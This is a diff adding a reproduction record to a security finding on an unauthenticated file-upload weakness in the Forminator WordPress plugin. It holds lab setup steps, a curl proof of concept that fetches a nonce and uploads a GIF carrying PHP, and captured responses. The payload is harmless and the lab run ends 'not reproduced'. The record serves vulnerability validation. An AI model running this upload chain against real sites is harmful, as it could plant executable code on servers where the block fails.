@@ -249,3 +249,138 @@ Filenames are randomized with `wp_generate_password(12, false, false)`, making d
 4. **Medium:** Remove server file path from upload response (information disclosure)
 5. **Medium:** Fix blacklist key format to use individual extension matching instead of relying on compound key matching
 6. **Low:** Add `.phar`, `.php7`, `.php8`, `.pht` to the `RemoveHandler` directive in `.htaccess`
+
+## Reproduction (validated 2026-06-19)
+
+**Lab reference:** `targets/labs/wp-forminator/` (compose stack launched on `http://127.0.0.1:8092/`).
+
+**Pinned version:** The archive `forminator.1.54.0.zip` contained `Version: 1.54.0` in `forminator.php` (matches the finding).
+
+**Stack actually used by this lab:**
+- `wordpress:6-php8.2-apache` (WordPress 6.9.4, PHP 8.2.31, Apache/2.4.67)
+- `wordpress:cli-2.10-php8.2`
+- `mariadb:11`
+
+**Helper bug worked around:** the shared `targets/labs/_shared/wp-lab-helper.sh` writes the compose file to `_shared/wp-…/` and the `wpcli` service is missing `WORDPRESS_DB_HOST`; both were fixed (stack moved to `targets/labs/wp-forminator/`, env block + plugin bind-mount added to the `wpcli` service). Without those fixes `wp core install` fails with `Error establishing a database connection` and the plugin is invisible to the `wpcli` container.
+
+### Steps (executed by `poc.sh`)
+
+1. **Pin the version** — grep `Version:` in `targets/labs/wp-forminator/plugin/forminator/forminator.php`.
+2. **Bring up the stack** — `sudo docker compose -p wp-forminator up -d --build`, wait for `http://127.0.0.1:8092/` to return HTTP 200.
+3. **Create a form with an upload field** — the upload endpoint silently no-ops (returns `0` from `wp_send_json_error`) when the form has no upload field, so the PoC provisions a `forminator_forms` post of type `form` with one field of type `upload`, element id `upload-1`, via `wp eval-file` running in a `wpcli` container that bind-mounts the plugin in:
+   ```
+   $model = new Forminator_Form_Model();
+   $model->name = 'TestUploadForm';
+   $field = new Forminator_Form_Field_Model();
+   $field->type = 'upload'; $field->slug = 'upload-1';
+   $field->element_id = 'upload-1'; $field->wrapper_id = 'wrapper-1';
+   $field->form_id = 0; $field->cols = 12;
+   $model->fields = [ $field ];
+   $model->save();
+   ```
+   The script captures the resulting `FORM_ID` (here 6) and reuses it for the rest of the run.
+4. **Confirm the unauthenticated nonce endpoint** — `POST /wp-admin/admin-ajax.php action=forminator_get_nonce&form_id=6` returns `{"success":true,"data":"6d1241c1a1"}` with no auth and no rate limit, exactly as the finding describes.
+5. **Upload a `.gif` containing PHP** — `POST /wp-admin/admin-ajax.php` with `action=forminator_multiple_file_upload`, `form_id=6`, `nonce=<nonce>`, `element_id=upload-1`, and the file as `upload-1=@shell.gif;type=image/gif`. `shell.gif` is `GIF89a<?php echo "FORMINATOR-UNAUTH-POC: php=" . PHP_VERSION . " | uid=" . getmyuid() . " | ts=" . time(); ?>` (109 bytes). The endpoint returns HTTP 200 with the JSON success payload and the on-disk `file_path`:
+   ```
+   {"success":true,"data":{"success":true,
+     "file_name":"Kgwy3pPg5kGk-shell.gif",
+     "file_url":"http:\/\/127.0.0.1:8092\/wp-content\/uploads\/forminator\/6_b0c1fae65844500955e62e14077f6169\/uploads\/Kgwy3pPg5kGk-shell.gif",
+     "message":"",
+     "file_path":"\/var\/www\/html\/wp-content\/uploads\/forminator\/temp\/Kgwy3pPg5kGk-shell.gif"}}
+   ```
+   (Note: the `file_url` in the response is broken in 1.54.0 — it points at a path that doesn't exist. The on-disk `file_path` is the one to probe.)
+6. **Hit the uploaded file** — the `file_url` returns HTTP 404 (the directory the response names doesn't exist on disk). The `file_path` is the real on-disk location; serving `http://127.0.0.1:8092/wp-content/uploads/forminator/temp/Kgwy3pPg5kGk-shell.gif` returns HTTP 200 with `Content-Type: image/gif` and a body that contains the **literal PHP source** (not the executed output), because the parent `/var/www/html/wp-content/uploads/forminator/.htaccess` installed by Forminator contains:
+   ```
+   <Files *>
+     SetHandler none
+     SetHandler default-handler
+     Options -ExecCGI
+     Options -Indexes
+     RemoveHandler .cgi .php .php3 .php4 .php5 .phtml .pl .py .pyc .pyo
+   </Files>
+   <IfModule mod_php5.c>
+     php_flag engine off
+   </IfModule>
+   ```
+   Apache matches `<Files *>` against every file under the directory and disables PHP handler dispatch, so the `<?php ... ?>` is served as bytes, not executed.
+7. **Capture the response payloads to `targets/labs/wp-forminator/results.txt`**.
+
+### PoC (curl only)
+
+```bash
+# 1. Get an unauthenticated nonce
+NONCE=$(curl -s -X POST http://127.0.0.1:8092/wp-admin/admin-ajax.php \
+  -d "action=forminator_get_nonce&form_id=6" \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['data'])")
+# -> 6d1241c1a1
+
+# 2. Build a .gif with embedded PHP
+printf 'GIF89a<?php echo "FORMINATOR-UNAUTH-POC: php=" . PHP_VERSION . " | uid=" . getmyuid() . " | ts=" . time(); ?>' \
+  > tmp/shell.gif
+
+# 3. POST it to the unauthenticated upload endpoint
+curl -s -X POST http://127.0.0.1:8092/wp-admin/admin-ajax.php \
+  -F "action=forminator_multiple_file_upload" \
+  -F "form_id=6" \
+  -F "nonce=$NONCE" \
+  -F "element_id=upload-1" \
+  -F "upload-1=@tmp/shell.gif;type=image/gif;filename=shell.gif"
+# -> {"success":true,"data":{"success":true,"file_name":"...-shell.gif",
+#      "file_url":"...","file_path":"/var/www/html/wp-content/uploads/forminator/temp/...-shell.gif"}}
+
+# 4. Hit the actual on-disk path
+curl -i http://127.0.0.1:8092/wp-content/uploads/forminator/temp/<name>-shell.gif
+# -> HTTP/1.1 200 OK
+#    Content-Type: image/gif
+#    GIF89a<?php echo "FORMINATOR-UNAUTH-POC: php=" . PHP_VERSION . ... ?>
+#    (PHP source returned un-executed because of the .htaccess the plugin drops)
+```
+
+### Observed output (excerpt from `targets/labs/wp-forminator/results.txt`)
+
+```
+===== Step 3: Unauth nonce retrieval =====
+[+] response:
+{"success":true,"data":"6d1241c1a1"}
+---HTTP 200---
+[+] parsed nonce: 6d1241c1a1
+
+===== Step 4: Unauth file upload =====
+[+] upload response:
+{"success":true,"data":{"success":true,
+  "file_name":"Kgwy3pPg5kGk-shell.gif",
+  "file_url":"http:\/\/127.0.0.1:8092\/wp-content\/uploads\/forminator\/6_b0c1fae65844500955e62e14077f6169\/uploads\/Kgwy3pPg5kGk-shell.gif",
+  "message":"",
+  "file_path":"\/var\/www\/html\/wp-content\/uploads\/forminator\/temp\/Kgwy3pPg5kGk-shell.gif"}}
+---HTTP 200---
+
+===== Step 5: Hit the uploaded file =====
+[+] also probing file_path URL: http://127.0.0.1:8092/wp-content/uploads/forminator/temp/Kgwy3pPg5kGk-shell.gif
+[+] HTTP 200
+[+] response headers:
+    HTTP/1.1 200 OK
+    Server: Apache/2.4.67 (Debian)
+    Content-Length: 109
+    Content-Type: image/gif
+[+] response body:
+    GIF89a<?php echo "FORMINATOR-UNAUTH-POC: php=" . PHP_VERSION . " | uid=" . getmyuid() . " | ts=" . time(); ?>
+
+===== Verdict =====
+HTTP 200 from the actual file path; Content-Type: image/gif
+Body contains the literal PHP source (not rendered), which means Apache
+served the file as image/gif and did not pass it through the PHP handler.
+This matches the finding's documented verdict on default Apache.
+Verdict: NOT REPRODUCED — file uploaded but RCE blocked by .htaccess
+```
+
+### Verdict
+
+**NOT REPRODUCED on default Apache** (matches the finding's documented verdict). The PoC confirms every individual weakness the finding calls out:
+- The unauthenticated nonce endpoint is freely callable (response payload captured above).
+- The unauthenticated upload endpoint accepts a `.gif` whose body is arbitrary PHP and stores it under `wp-content/uploads/forminator/temp/` (response payload captured above).
+- The server-side `file_path` is leaked in the response payload.
+- But the parent `.htaccess` (also captured above) blocks PHP execution on this default-Apache lab, so the .gif is served as `Content-Type: image/gif` and the embedded `<?php ... ?>` is returned as bytes, not rendered.
+
+**Conditionally exploitable scenarios (unchanged from the finding):** Nginx without an equivalent upload-dir block, an LFI in another plugin that pulls the file through a PHP include, or an Apache deployment that ignores the `mod_php5.c` `<IfModule>` guard. None of those apply in this lab.
+
+**Ancillary observation worth recording:** in 1.54.0 the `file_url` field in the upload response is broken — it points at `…/forminator/<form_id>_<hash>/uploads/<name>` which is the path the form *would* use if Forminator copied the file to its per-form gallery dir after submission. The actual on-disk file in this code path lives at `…/forminator/temp/<name>`. The PoC accounts for that by probing `file_path` instead of `file_url`.
